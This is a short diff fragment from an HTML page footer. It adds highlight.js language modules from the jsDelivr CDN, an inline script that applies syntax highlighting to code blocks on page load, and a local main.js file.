+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
 </body>
 </html>
